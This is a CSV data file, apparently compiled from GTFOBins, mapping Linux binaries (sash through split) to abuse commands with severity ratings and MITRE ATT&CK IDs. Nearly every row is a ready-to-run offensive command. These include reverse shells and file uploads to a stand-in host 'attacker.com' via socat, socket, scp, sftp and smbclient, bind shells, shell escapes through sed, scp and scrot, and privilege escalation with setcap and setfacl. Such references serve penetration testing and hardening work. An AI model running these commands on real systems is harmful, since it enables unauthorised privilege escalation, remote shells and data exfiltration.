1557,Linux,sash,Abuse the 'sash' binary (shell) in a unprivileged context to escalate privileges or execute arbitrary actions.,Shell Escape,High,T1548,https://gtfobins.github.io/gtfobins/sash/
1558,Linux,scanmem shell /bin/sh,Abuse the 'scanmem' binary (shell) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/scanmem/
1559,Linux,scanmem shell /bin/sh,Abuse the 'scanmem' binary (shell) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,Critical,T1548.001,https://gtfobins.github.io/gtfobins/scanmem/
1560,Linux,scanmem shell /bin/sh,Abuse the 'scanmem' binary (shell) in a unprivileged context to escalate privileges or execute arbitrary actions.,Shell Escape,High,T1548,https://gtfobins.github.io/gtfobins/scanmem/
1561,Linux,scp user@attacker.com:/path/to/input-file /path/to/output-file,Abuse the 'scp' binary (download) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/scp/
1562,Linux,scp user@attacker.com:/path/to/input-file /path/to/output-file,Abuse the 'scp' binary (download) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,Medium,T1548.001,https://gtfobins.github.io/gtfobins/scp/
1563,Linux,scp user@attacker.com:/path/to/input-file /path/to/output-file,Abuse the 'scp' binary (download) in a unprivileged context to escalate privileges or execute arbitrary actions.,File Download,Low,T1105,https://gtfobins.github.io/gtfobins/scp/
1564,Linux,echo 'exec /bin/sh 0<&2 1>&2' >/path/to/temp-file chmod +x /path/to/temp-file scp -S /path/to/temp-file x x:,Abuse the 'scp' binary (shell) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/scp/
1565,Linux,echo 'exec /bin/sh 0<&2 1>&2' >/path/to/temp-file chmod +x /path/to/temp-file scp -S /path/to/temp-file x x:,Abuse the 'scp' binary (shell) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,Critical,T1548.001,https://gtfobins.github.io/gtfobins/scp/
1566,Linux,echo 'exec /bin/sh 0<&2 1>&2' >/path/to/temp-file chmod +x /path/to/temp-file scp -S /path/to/temp-file x x:,Abuse the 'scp' binary (shell) in a unprivileged context to escalate privileges or execute arbitrary actions.,Shell Escape,High,T1548,https://gtfobins.github.io/gtfobins/scp/
1567,Linux,scp -o 'ProxyCommand=;/bin/sh 0<&2 1>&2' x x:,Abuse the 'scp' binary (shell) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/scp/
1568,Linux,scp -o 'ProxyCommand=;/bin/sh 0<&2 1>&2' x x:,Abuse the 'scp' binary (shell) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,Critical,T1548.001,https://gtfobins.github.io/gtfobins/scp/
1569,Linux,scp -o 'ProxyCommand=;/bin/sh 0<&2 1>&2' x x:,Abuse the 'scp' binary (shell) in a unprivileged context to escalate privileges or execute arbitrary actions.,Shell Escape,High,T1548,https://gtfobins.github.io/gtfobins/scp/
1570,Linux,scp /path/to/input-file user@attacker.com:/path/to/output-file,Abuse the 'scp' binary (upload) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,High,T1548.003,https://gtfobins.github.io/gtfobins/scp/
1571,Linux,scp /path/to/input-file user@attacker.com:/path/to/output-file,Abuse the 'scp' binary (upload) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,High,T1548.001,https://gtfobins.github.io/gtfobins/scp/
1572,Linux,scp /path/to/input-file user@attacker.com:/path/to/output-file,Abuse the 'scp' binary (upload) in a unprivileged context to escalate privileges or execute arbitrary actions.,File Upload,Medium,T1105,https://gtfobins.github.io/gtfobins/scp/
1573,Linux,screen -L -Logfile /path/to/output-file echo DATA,Abuse the 'screen' binary (file write) in a sudo context to escalate privileges or execute arbitrary actions. Data is appended to the file and `\n` is converted to `\r\n`.,Sudo Misconfiguration,High,T1548.003,https://gtfobins.github.io/gtfobins/screen/
1574,Linux,screen -L -Logfile /path/to/output-file echo DATA,Abuse the 'screen' binary (file write) in a unprivileged context to escalate privileges or execute arbitrary actions. Data is appended to the file and `\n` is converted to `\r\n`.,Arbitrary File Write,Medium,T1222,https://gtfobins.github.io/gtfobins/screen/
1575,Linux,screen -L /path/to/output-file echo DATA,Abuse the 'screen' binary (file write) in a sudo context to escalate privileges or execute arbitrary actions. Data is appended to the file and `\n` is converted to `\r\n`.,Sudo Misconfiguration,High,T1548.003,https://gtfobins.github.io/gtfobins/screen/
1576,Linux,screen -L /path/to/output-file echo DATA,Abuse the 'screen' binary (file write) in a unprivileged context to escalate privileges or execute arbitrary actions. Data is appended to the file and `\n` is converted to `\r\n`.,Arbitrary File Write,Medium,T1222,https://gtfobins.github.io/gtfobins/screen/
1577,Linux,screen,Abuse the 'screen' binary (shell) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/screen/
1578,Linux,screen,Abuse the 'screen' binary (shell) in a unprivileged context to escalate privileges or execute arbitrary actions.,Shell Escape,High,T1548,https://gtfobins.github.io/gtfobins/screen/
1579,Linux,script -q -c '# DATA' /path/to/output-file,Abuse the 'script' binary (file write) in a sudo context to escalate privileges or execute arbitrary actions. The content appears among the log prints.,Sudo Misconfiguration,High,T1548.003,https://gtfobins.github.io/gtfobins/script/
1580,Linux,script -q -c '# DATA' /path/to/output-file,Abuse the 'script' binary (file write) in a suid context to escalate privileges or execute arbitrary actions. The content appears among the log prints.,SUID Binaries,High,T1548.001,https://gtfobins.github.io/gtfobins/script/
1581,Linux,script -q -c '# DATA' /path/to/output-file,Abuse the 'script' binary (file write) in a unprivileged context to escalate privileges or execute arbitrary actions. The content appears among the log prints.,Arbitrary File Write,Medium,T1222,https://gtfobins.github.io/gtfobins/script/
1582,Linux,script -q /dev/null,Abuse the 'script' binary (shell) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/script/
1583,Linux,script -q /dev/null,Abuse the 'script' binary (shell) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,Critical,T1548.001,https://gtfobins.github.io/gtfobins/script/
1584,Linux,script -q /dev/null,Abuse the 'script' binary (shell) in a unprivileged context to escalate privileges or execute arbitrary actions.,Shell Escape,High,T1548,https://gtfobins.github.io/gtfobins/script/
1585,Linux,scrot -e /bin/sh,Abuse the 'scrot' binary (shell) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/scrot/
1586,Linux,scrot -e /bin/sh,Abuse the 'scrot' binary (shell) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,Critical,T1548.001,https://gtfobins.github.io/gtfobins/scrot/
1587,Linux,scrot -e /bin/sh,Abuse the 'scrot' binary (shell) in a unprivileged context to escalate privileges or execute arbitrary actions.,Shell Escape,High,T1548,https://gtfobins.github.io/gtfobins/scrot/
1588,Linux,sed '' /path/to/input-file,Abuse the 'sed' binary (file read) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/sed/
1589,Linux,sed '' /path/to/input-file,Abuse the 'sed' binary (file read) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,Medium,T1548.001,https://gtfobins.github.io/gtfobins/sed/
1590,Linux,sed '' /path/to/input-file,Abuse the 'sed' binary (file read) in a unprivileged context to escalate privileges or execute arbitrary actions.,Arbitrary File Read,Low,T1552,https://gtfobins.github.io/gtfobins/sed/
1591,Linux,sed -n '1s/.*/DATA/w /path/to/output-file' /etc/hosts,Abuse the 'sed' binary (file write) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,High,T1548.003,https://gtfobins.github.io/gtfobins/sed/
1592,Linux,sed -n '1s/.*/DATA/w /path/to/output-file' /etc/hosts,Abuse the 'sed' binary (file write) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,High,T1548.001,https://gtfobins.github.io/gtfobins/sed/
1593,Linux,sed -n '1s/.*/DATA/w /path/to/output-file' /etc/hosts,Abuse the 'sed' binary (file write) in a unprivileged context to escalate privileges or execute arbitrary actions.,Arbitrary File Write,Medium,T1222,https://gtfobins.github.io/gtfobins/sed/
1594,Linux,sed -n '1e exec /bin/sh 1>&0' /etc/hosts,Abuse the 'sed' binary (shell) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/sed/
1595,Linux,sed -n '1e exec /bin/sh 1>&0' /etc/hosts,Abuse the 'sed' binary (shell) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,Critical,T1548.001,https://gtfobins.github.io/gtfobins/sed/
1596,Linux,sed -n '1e exec /bin/sh 1>&0' /etc/hosts,Abuse the 'sed' binary (shell) in a unprivileged context to escalate privileges or execute arbitrary actions.,Shell Escape,High,T1548,https://gtfobins.github.io/gtfobins/sed/
1597,Linux,sed e,Abuse the 'sed' binary (shell) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/sed/
1598,Linux,sed e,Abuse the 'sed' binary (shell) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,Critical,T1548.001,https://gtfobins.github.io/gtfobins/sed/
1599,Linux,sed e,Abuse the 'sed' binary (shell) in a unprivileged context to escalate privileges or execute arbitrary actions.,Shell Escape,High,T1548,https://gtfobins.github.io/gtfobins/sed/
1600,Linux,service ../../bin/sh,Abuse the 'service' binary (shell) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/service/
1601,Linux,service ../../bin/sh,Abuse the 'service' binary (shell) in a unprivileged context to escalate privileges or execute arbitrary actions.,Shell Escape,High,T1548,https://gtfobins.github.io/gtfobins/service/
1602,Linux,setarch -3 /bin/sh,Abuse the 'setarch' binary (shell) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/setarch/
1603,Linux,setarch -3 /bin/sh -p,Abuse the 'setarch' binary (shell) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,Critical,T1548.001,https://gtfobins.github.io/gtfobins/setarch/
1604,Linux,setarch -3 /bin/sh,Abuse the 'setarch' binary (shell) in a unprivileged context to escalate privileges or execute arbitrary actions.,Shell Escape,High,T1548,https://gtfobins.github.io/gtfobins/setarch/
1605,Linux,setcap cap_setuid+ep /path/to/command,Abuse the 'setcap' binary (privilege escalation) in a sudo context to escalate privileges or execute arbitrary actions. This can be used to assign capabilities to executable files.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/setcap/
1606,Linux,setcap cap_setuid+ep /path/to/command,Abuse the 'setcap' binary (privilege escalation) in a suid context to escalate privileges or execute arbitrary actions. This can be used to assign capabilities to executable files.,SUID Binaries,Critical,T1548.001,https://gtfobins.github.io/gtfobins/setcap/
1607,Linux,setfacl -m u:$(id -un):rwx /path/to/input-file,"Abuse the 'setfacl' binary (privilege escalation) in a sudo context to escalate privileges or execute arbitrary actions. This can be run with elevated privileges to change ownership and then read, write, or execute a file.",Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/setfacl/
1608,Linux,setfacl -m u:$(id -un):rwx /path/to/input-file,"Abuse the 'setfacl' binary (privilege escalation) in a suid context to escalate privileges or execute arbitrary actions. This can be run with elevated privileges to change ownership and then read, write, or execute a file.",SUID Binaries,Critical,T1548.001,https://gtfobins.github.io/gtfobins/setfacl/
1609,Linux,setlock - /bin/sh,Abuse the 'setlock' binary (shell) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/setlock/
1610,Linux,setlock - /bin/sh -p,Abuse the 'setlock' binary (shell) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,Critical,T1548.001,https://gtfobins.github.io/gtfobins/setlock/
1611,Linux,setlock - /bin/sh,Abuse the 'setlock' binary (shell) in a unprivileged context to escalate privileges or execute arbitrary actions.,Shell Escape,High,T1548,https://gtfobins.github.io/gtfobins/setlock/
1612,Linux,sftp user@attacker.com get /path/to/input-file /path/to/output-file,Abuse the 'sftp' binary (download) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/sftp/
1613,Linux,sftp user@attacker.com get /path/to/input-file /path/to/output-file,Abuse the 'sftp' binary (download) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,Medium,T1548.001,https://gtfobins.github.io/gtfobins/sftp/
1614,Linux,sftp user@attacker.com get /path/to/input-file /path/to/output-file,Abuse the 'sftp' binary (download) in a unprivileged context to escalate privileges or execute arbitrary actions.,File Download,Low,T1105,https://gtfobins.github.io/gtfobins/sftp/
1615,Linux,sftp user@attacker.com !/bin/sh,Abuse the 'sftp' binary (shell) in a sudo context to escalate privileges or execute arbitrary actions. This still requires a successfull connection to the server.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/sftp/
1616,Linux,sftp user@attacker.com !/bin/sh,Abuse the 'sftp' binary (shell) in a suid context to escalate privileges or execute arbitrary actions. This still requires a successfull connection to the server.,SUID Binaries,Critical,T1548.001,https://gtfobins.github.io/gtfobins/sftp/
1617,Linux,sftp user@attacker.com !/bin/sh,Abuse the 'sftp' binary (shell) in a unprivileged context to escalate privileges or execute arbitrary actions. This still requires a successfull connection to the server.,Shell Escape,High,T1548,https://gtfobins.github.io/gtfobins/sftp/
1618,Linux,sftp user@attacker.com put /path/to/input-file /path/to/output-file,Abuse the 'sftp' binary (upload) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,High,T1548.003,https://gtfobins.github.io/gtfobins/sftp/
1619,Linux,sftp user@attacker.com put /path/to/input-file /path/to/output-file,Abuse the 'sftp' binary (upload) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,High,T1548.001,https://gtfobins.github.io/gtfobins/sftp/
1620,Linux,sftp user@attacker.com put /path/to/input-file /path/to/output-file,Abuse the 'sftp' binary (upload) in a unprivileged context to escalate privileges or execute arbitrary actions.,File Upload,Medium,T1105,https://gtfobins.github.io/gtfobins/sftp/
1621,Linux,sg root,"Abuse the 'sg' binary (shell) in a sudo context to escalate privileges or execute arbitrary actions. Commands can be run if the current user's group is specified, therefore no additional permissions are needed.",Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/sg/
1622,Linux,sg $(id -ng),"Abuse the 'sg' binary (shell) in a unprivileged context to escalate privileges or execute arbitrary actions. Commands can be run if the current user's group is specified, therefore no additional permissions are needed.",Shell Escape,High,T1548,https://gtfobins.github.io/gtfobins/sg/
1623,Linux,shred -u /path/to/output-file,Abuse the 'shred' binary (file write) in a sudo context to escalate privileges or execute arbitrary actions. This actually deletes the chosen file.,Sudo Misconfiguration,High,T1548.003,https://gtfobins.github.io/gtfobins/shred/
1624,Linux,shred -u /path/to/output-file,Abuse the 'shred' binary (file write) in a suid context to escalate privileges or execute arbitrary actions. This actually deletes the chosen file.,SUID Binaries,High,T1548.001,https://gtfobins.github.io/gtfobins/shred/
1625,Linux,shred -u /path/to/output-file,Abuse the 'shred' binary (file write) in a unprivileged context to escalate privileges or execute arbitrary actions. This actually deletes the chosen file.,Arbitrary File Write,Medium,T1222,https://gtfobins.github.io/gtfobins/shred/
1626,Linux,shuf -z /path/to/input-file,Abuse the 'shuf' binary (file read) in a sudo context to escalate privileges or execute arbitrary actions. The read file content is corrupted by randomizing the order of NUL terminated strings.,Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/shuf/
1627,Linux,shuf -z /path/to/input-file,Abuse the 'shuf' binary (file read) in a suid context to escalate privileges or execute arbitrary actions. The read file content is corrupted by randomizing the order of NUL terminated strings.,SUID Binaries,Medium,T1548.001,https://gtfobins.github.io/gtfobins/shuf/
1628,Linux,shuf -z /path/to/input-file,Abuse the 'shuf' binary (file read) in a unprivileged context to escalate privileges or execute arbitrary actions. The read file content is corrupted by randomizing the order of NUL terminated strings.,Arbitrary File Read,Low,T1552,https://gtfobins.github.io/gtfobins/shuf/
1629,Linux,shuf -e DATA -o /path/to/output-file,Abuse the 'shuf' binary (file write) in a sudo context to escalate privileges or execute arbitrary actions. The written file content is corrupted by adding a newline.,Sudo Misconfiguration,High,T1548.003,https://gtfobins.github.io/gtfobins/shuf/
1630,Linux,shuf -e DATA -o /path/to/output-file,Abuse the 'shuf' binary (file write) in a suid context to escalate privileges or execute arbitrary actions. The written file content is corrupted by adding a newline.,SUID Binaries,High,T1548.001,https://gtfobins.github.io/gtfobins/shuf/
1631,Linux,shuf -e DATA -o /path/to/output-file,Abuse the 'shuf' binary (file write) in a unprivileged context to escalate privileges or execute arbitrary actions. The written file content is corrupted by adding a newline.,Arbitrary File Write,Medium,T1222,https://gtfobins.github.io/gtfobins/shuf/
1632,Linux,"slsh -e 'system(""/bin/sh"")'",Abuse the 'slsh' binary (shell) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/slsh/
1633,Linux,"slsh -e 'system(""/bin/sh"")'",Abuse the 'slsh' binary (shell) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,Critical,T1548.001,https://gtfobins.github.io/gtfobins/slsh/
1634,Linux,"slsh -e 'system(""/bin/sh"")'",Abuse the 'slsh' binary (shell) in a unprivileged context to escalate privileges or execute arbitrary actions.,Shell Escape,High,T1548,https://gtfobins.github.io/gtfobins/slsh/
1635,Linux,smbclient '\\attacker.com\share' -c 'get /path/to/input-file /path/to/output-file',Abuse the 'smbclient' binary (download) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/smbclient/
1636,Linux,smbclient '\\attacker.com\share' -c 'get /path/to/input-file /path/to/output-file',Abuse the 'smbclient' binary (download) in a unprivileged context to escalate privileges or execute arbitrary actions.,File Download,Low,T1105,https://gtfobins.github.io/gtfobins/smbclient/
1637,Linux,smbclient '\\host\share' !/bin/sh,Abuse the 'smbclient' binary (shell) in a sudo context to escalate privileges or execute arbitrary actions. A valid SMB/CIFS server must be available.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/smbclient/
1638,Linux,smbclient '\\host\share' !/bin/sh,Abuse the 'smbclient' binary (shell) in a unprivileged context to escalate privileges or execute arbitrary actions. A valid SMB/CIFS server must be available.,Shell Escape,High,T1548,https://gtfobins.github.io/gtfobins/smbclient/
1639,Linux,smbclient '\\attacker.com\share' -c 'put /path/to/input-file /path/to/output-file',Abuse the 'smbclient' binary (upload) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,High,T1548.003,https://gtfobins.github.io/gtfobins/smbclient/
1640,Linux,smbclient '\\attacker.com\share' -c 'put /path/to/input-file /path/to/output-file',Abuse the 'smbclient' binary (upload) in a unprivileged context to escalate privileges or execute arbitrary actions.,File Upload,Medium,T1105,https://gtfobins.github.io/gtfobins/smbclient/
1641,Linux,snap install xxxx_1.0_all.snap --dangerous --devmode,Abuse the 'snap' binary (command) in a sudo context to escalate privileges or execute arbitrary actions. Generate the Snap package with [fpm](https://github.com/jordansissel/fpm) and upload it to the target. ``` mkdir -p meta/hooks echo -e '#!/bin/sh\n/path/to/command; false' >meta/hooks/install chmod +x meta/hooks/install fpm -n xxxx -s dir -t snap -a all meta ```,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/snap/
1642,Linux,"socat tcp-listen:12345,reuseaddr,fork exec:/bin/sh,pty,stderr,setsid,sigint,sane",Abuse the 'socat' binary (bind shell) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/socat/
1643,Linux,"socat tcp-listen:12345,reuseaddr,fork 'exec:/bin/sh -p,pty,stderr,setsid,sigint,sane'",Abuse the 'socat' binary (bind shell) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,Critical,T1548.001,https://gtfobins.github.io/gtfobins/socat/
1644,Linux,"socat tcp-listen:12345,reuseaddr,fork exec:/bin/sh,pty,stderr,setsid,sigint,sane",Abuse the 'socat' binary (bind shell) in a unprivileged context to escalate privileges or execute arbitrary actions.,Bind Shell,High,T1059,https://gtfobins.github.io/gtfobins/socat/
1645,Linux,"socat -u tcp-connect:attacker.com:12345 open:/path/to/output-file,creat",Abuse the 'socat' binary (download) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/socat/
1646,Linux,"socat -u tcp-connect:attacker.com:12345 open:/path/to/output-file,creat",Abuse the 'socat' binary (download) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,Medium,T1548.001,https://gtfobins.github.io/gtfobins/socat/
1647,Linux,"socat -u tcp-connect:attacker.com:12345 open:/path/to/output-file,creat",Abuse the 'socat' binary (download) in a unprivileged context to escalate privileges or execute arbitrary actions.,File Download,Low,T1105,https://gtfobins.github.io/gtfobins/socat/
1648,Linux,socat -u file:/path/to/input-file -,Abuse the 'socat' binary (file read) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/socat/
1649,Linux,socat -u file:/path/to/input-file -,Abuse the 'socat' binary (file read) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,Medium,T1548.001,https://gtfobins.github.io/gtfobins/socat/
1650,Linux,socat -u file:/path/to/input-file -,Abuse the 'socat' binary (file read) in a unprivileged context to escalate privileges or execute arbitrary actions.,Arbitrary File Read,Low,T1552,https://gtfobins.github.io/gtfobins/socat/
1651,Linux,"socat -u 'exec:echo DATA' open:/path/to/output-file,creat",Abuse the 'socat' binary (file write) in a sudo context to escalate privileges or execute arbitrary actions. The `echo` command is actually used.,Sudo Misconfiguration,High,T1548.003,https://gtfobins.github.io/gtfobins/socat/
1652,Linux,"socat -u 'exec:echo DATA' open:/path/to/output-file,creat",Abuse the 'socat' binary (file write) in a suid context to escalate privileges or execute arbitrary actions. The `echo` command is actually used.,SUID Binaries,High,T1548.001,https://gtfobins.github.io/gtfobins/socat/
1653,Linux,"socat -u 'exec:echo DATA' open:/path/to/output-file,creat",Abuse the 'socat' binary (file write) in a unprivileged context to escalate privileges or execute arbitrary actions. The `echo` command is actually used.,Arbitrary File Write,Medium,T1222,https://gtfobins.github.io/gtfobins/socat/
1654,Linux,"socat tcp-connect:attacker.com:12345 exec:/bin/sh,pty,stderr,setsid,sigint,sane",Abuse the 'socat' binary (reverse shell) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/socat/
1655,Linux,"socat tcp-connect:attacker.com:12345 'exec:/bin/sh -p,pty,stderr,setsid,sigint,sane'",Abuse the 'socat' binary (reverse shell) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,Critical,T1548.001,https://gtfobins.github.io/gtfobins/socat/
1656,Linux,"socat tcp-connect:attacker.com:12345 exec:/bin/sh,pty,stderr,setsid,sigint,sane",Abuse the 'socat' binary (reverse shell) in a unprivileged context to escalate privileges or execute arbitrary actions.,Reverse Shell,High,T1059,https://gtfobins.github.io/gtfobins/socat/
1657,Linux,"socat - exec:/bin/sh,pty,ctty,raw,echo=0",Abuse the 'socat' binary (shell) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/socat/
1658,Linux,"socat - 'exec:/bin/sh -p,pty,ctty,raw,echo=0'",Abuse the 'socat' binary (shell) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,Critical,T1548.001,https://gtfobins.github.io/gtfobins/socat/
1659,Linux,"socat - exec:/bin/sh,pty,ctty,raw,echo=0",Abuse the 'socat' binary (shell) in a unprivileged context to escalate privileges or execute arbitrary actions.,Shell Escape,High,T1548,https://gtfobins.github.io/gtfobins/socat/
1660,Linux,socat -u file:/path/to/input-file tcp-connect:attacker.com:12345,Abuse the 'socat' binary (upload) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,High,T1548.003,https://gtfobins.github.io/gtfobins/socat/
1661,Linux,socat -u file:/path/to/input-file tcp-connect:attacker.com:12345,Abuse the 'socat' binary (upload) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,High,T1548.001,https://gtfobins.github.io/gtfobins/socat/
1662,Linux,socat -u file:/path/to/input-file tcp-connect:attacker.com:12345,Abuse the 'socat' binary (upload) in a unprivileged context to escalate privileges or execute arbitrary actions.,File Upload,Medium,T1105,https://gtfobins.github.io/gtfobins/socat/
1663,Linux,socket -svp '/bin/sh -i' 12345,Abuse the 'socket' binary (bind shell) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/socket/
1664,Linux,socket -svp '/bin/sh -i' 12345,Abuse the 'socket' binary (bind shell) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,Critical,T1548.001,https://gtfobins.github.io/gtfobins/socket/
1665,Linux,socket -svp '/bin/sh -i' 12345,Abuse the 'socket' binary (bind shell) in a unprivileged context to escalate privileges or execute arbitrary actions.,Bind Shell,High,T1059,https://gtfobins.github.io/gtfobins/socket/
1666,Linux,socket -qvp '/bin/sh -i' attacker.com 12345,Abuse the 'socket' binary (reverse shell) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/socket/
1667,Linux,socket -qvp '/bin/sh -i' attacker.com 12345,Abuse the 'socket' binary (reverse shell) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,Critical,T1548.001,https://gtfobins.github.io/gtfobins/socket/
1668,Linux,socket -qvp '/bin/sh -i' attacker.com 12345,Abuse the 'socket' binary (reverse shell) in a unprivileged context to escalate privileges or execute arbitrary actions.,Reverse Shell,High,T1059,https://gtfobins.github.io/gtfobins/socket/
1669,Linux,soelim /path/to/input-file,Abuse the 'soelim' binary (file read) in a sudo context to escalate privileges or execute arbitrary actions. The content is actually parsed and corrupted by the command.,Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/soelim/
1670,Linux,soelim /path/to/input-file,Abuse the 'soelim' binary (file read) in a suid context to escalate privileges or execute arbitrary actions. The content is actually parsed and corrupted by the command.,SUID Binaries,Medium,T1548.001,https://gtfobins.github.io/gtfobins/soelim/
1671,Linux,soelim /path/to/input-file,Abuse the 'soelim' binary (file read) in a unprivileged context to escalate privileges or execute arbitrary actions. The content is actually parsed and corrupted by the command.,Arbitrary File Read,Low,T1552,https://gtfobins.github.io/gtfobins/soelim/
1672,Linux,softlimit /bin/sh,Abuse the 'softlimit' binary (shell) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/softlimit/
1673,Linux,softlimit /bin/sh -p,Abuse the 'softlimit' binary (shell) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,Critical,T1548.001,https://gtfobins.github.io/gtfobins/softlimit/
1674,Linux,softlimit /bin/sh,Abuse the 'softlimit' binary (shell) in a unprivileged context to escalate privileges or execute arbitrary actions.,Shell Escape,High,T1548,https://gtfobins.github.io/gtfobins/softlimit/
1675,Linux,sort -m /path/to/input-file,Abuse the 'sort' binary (file read) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/sort/
1676,Linux,sort -m /path/to/input-file,Abuse the 'sort' binary (file read) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,Medium,T1548.001,https://gtfobins.github.io/gtfobins/sort/
1677,Linux,sort -m /path/to/input-file,Abuse the 'sort' binary (file read) in a unprivileged context to escalate privileges or execute arbitrary actions.,Arbitrary File Read,Low,T1552,https://gtfobins.github.io/gtfobins/sort/
1678,Linux,echo DATA | sort -m -o /path/to/output-file,Abuse the 'sort' binary (file write) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,High,T1548.003,https://gtfobins.github.io/gtfobins/sort/
1679,Linux,echo DATA | sort -m -o /path/to/output-file,Abuse the 'sort' binary (file write) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,High,T1548.001,https://gtfobins.github.io/gtfobins/sort/
1680,Linux,echo DATA | sort -m -o /path/to/output-file,Abuse the 'sort' binary (file write) in a unprivileged context to escalate privileges or execute arbitrary actions.,Arbitrary File Write,Medium,T1222,https://gtfobins.github.io/gtfobins/sort/
1681,Linux,split -b 999 --additional-suffix suffix /path/to/input-file prefix cat prefixaasuffix,"Abuse the 'split' binary (file read) in a sudo context to escalate privileges or execute arbitrary actions. This copies the input file in the current working directory in a file named `prefixaasuffix`, just make sure to pick a value big enough, instead of `999`.",Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/split/
1682,Linux,split -b 999 --additional-suffix suffix /path/to/input-file prefix cat prefixaasuffix,"Abuse the 'split' binary (file read) in a suid context to escalate privileges or execute arbitrary actions. This copies the input file in the current working directory in a file named `prefixaasuffix`, just make sure to pick a value big enough, instead of `999`.",SUID Binaries,Medium,T1548.001,https://gtfobins.github.io/gtfobins/split/
